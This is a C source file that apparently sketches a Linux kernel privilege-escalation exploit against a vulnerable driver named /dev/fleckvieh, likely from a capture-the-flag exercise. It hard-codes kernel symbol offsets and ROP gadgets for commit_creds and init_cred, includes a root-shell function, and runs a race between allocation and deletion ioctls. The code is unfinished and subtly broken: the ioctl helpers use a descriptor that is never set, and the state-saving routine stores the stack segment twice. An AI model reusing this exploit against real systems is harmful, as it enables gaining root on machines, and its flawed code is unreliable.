#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/userfaultfd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
#include <pthread.h>
#include <poll.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <string.h>
#include <sched.h>
#include <signal.h>

#define ofs_tty_ops 0xc3c3c0
#define addr_modprobe_path (kbase + 0xe37ea0)
#define rop_push_rdx_cmp_eax_415B005Ch_pop_rsp_rbp (kbase + 0x09b13a)
#define rop_pop_rdi (kbase + 0x09b0ed)
#define addr_init_cred (kbase + 0xe37480)
#define addr_commit_creds (kbase + 0x072830)
#define addr_kpti_trampoline (kbase + 0x800e26)
#define ERR(msg)    \
        do{             \
            perror(msg);    \
            exit(EXIT_FAILURE); \
          }while(0)

#define CMD_ADD 0xf1ec0001
#define CMD_DEL 0xf1ec0002
#define CMD_GET 0xf1ec0003
#define CMD_SET 0xf1ec0004

typedef struct {
  int id;
  size_t size;
  char *data;
} request_t;

unsigned long user_cs, user_ss, user_rsp, user_rflags;

static void shell()
{
    char *argv[] = {"/bin/sh",NULL};
    char *envp[] = {NULL};
    puts("ROOOT");
    execve("/bin/sh",argv,envp);
}


static void save_state()
{
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_ss), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

cpu_set_t pwn_cpu;
int global_fd;

int add(char *data, size_t size)
{
    request_t req = {
        .size = size,
        .data = data
    };
    int r = ioctl(global_fd,CMD_ADD,&req);
    if(r==-1){
        ERR("blob_add");
    }

    return r;
}

int del(int id)
{
    request_t req = {
        .id = id
    };
    int r = ioctl(global_fd,CMD_DEL,&req);
    if(r==-1){
        ERR("blob_del");
    }

    return r;
}

int get(char *data, size_t size)
{
    request_t req = {
        .data = data,
        .size = size
    };
    int r = ioctl(global_fd,CMD_GET,&req);
    if(r==-1){
        ERR("blob_get");
    }
    return r;
}

int set(char *data, size_t size)
{
    request_t req = {
        .data = data,
        .size = size
    };
    int r = ioctl(global_fd,CMD_SET,&req);
    if(r==-1){
        ERR("blob_set");
    }

    return r;
}

int race_win;

void *race(void *arg)
{
    int id;
    while(!race_win){
        id = add("hello",6);
        del(id);
    }
}

int main()
{
    int fd = open("/dev/fleckvieh",O_RDWR);
    if(fd==-1){
        ERR("module_open");
    }

    race_win = 0;
    pthread_t th;

    pthread_create(&th,NULL,race,NULL);

    int id;
    for(int i=0; i<0x1000;i++){
        id = add("sanguan",8);
        del(id);
    }

    race_win = 1;
    pthread_join(th,NULL);
    close(fd);
}